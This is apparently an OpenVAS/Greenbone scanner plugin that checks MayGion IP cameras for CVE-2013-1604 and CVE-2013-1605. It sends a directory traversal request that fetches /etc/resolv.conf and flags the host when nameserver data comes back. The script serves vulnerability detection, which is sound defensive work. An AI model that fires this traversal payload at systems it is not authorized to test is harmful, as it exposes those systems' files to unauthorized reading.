if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803774" );
	script_version( "$Revision: 13469 $" );
	script_bugtraq_id( 60192, 60196 );
	script_cve_id( "CVE-2013-1604", "CVE-2013-1605" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "$Date: 2019-02-05 13:31:12 +0100 (Tue, 05 Feb 2019) $" );
	script_tag( name: "creation_date", value: "2013-10-28 15:46:55 +0530 (Mon, 28 Oct 2013)" );
	script_name( "MayGion IP Cameras Multiple Vulnerabilities" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to gain access to
  information or cause a buffer overflow, resulting in a denial of service
  or potentially allowing the execution of arbitrary code." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP GET request and check whether it
  is able to read the sensitive information or not." );
	script_tag( name: "insight", value: "- The flaw is due to the program not properly sanitizing user input,
   specifically directory traversal style attacks (e.g., ../../).

  - User-supplied input is not properly validated when handling a specially
   crafted GET request. This may allow a remote attacker to cause a buffer
   overflow, resulting in a denial of service or potentially allowing the
   execution of arbitrary code." );
	script_tag( name: "solution", value: "Upgrade to H.264 ipcam firmware 2013.04.22 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "This host is running MayGion IP Camera and is prone to multiple
  vulnerabilities." );
	script_tag( name: "affected", value: "MayGion IP cameras firmware version 2011.27.09" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2013/May/194" );
	script_xref( name: "URL", value: "http://www.coresecurity.com/advisories/maygion-IP-cameras-multiple-vulnerabilities" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (c) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_maygion_ipcamera_detect.sc" );
	script_require_ports( "Services/www", 81 );
	script_mandatory_keys( "maygion/ip_camera/detected" );
	script_xref( name: "URL", value: "http://www.maygion.com" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
CPE = "cpe:/a:maygion:ip_camera";
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
req = "GET /../../../../../../../../../etc/resolv.conf HTTP/1.1\r\n\r\n";
res = http_send_recv( port: port, data: req, bodyonly: FALSE );
if(IsMatchRegexp( res, "HTTP/1.. 200 OK" ) && ContainsString( res, "nameserver" ) && ContainsString( res, "application/octet-stream" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

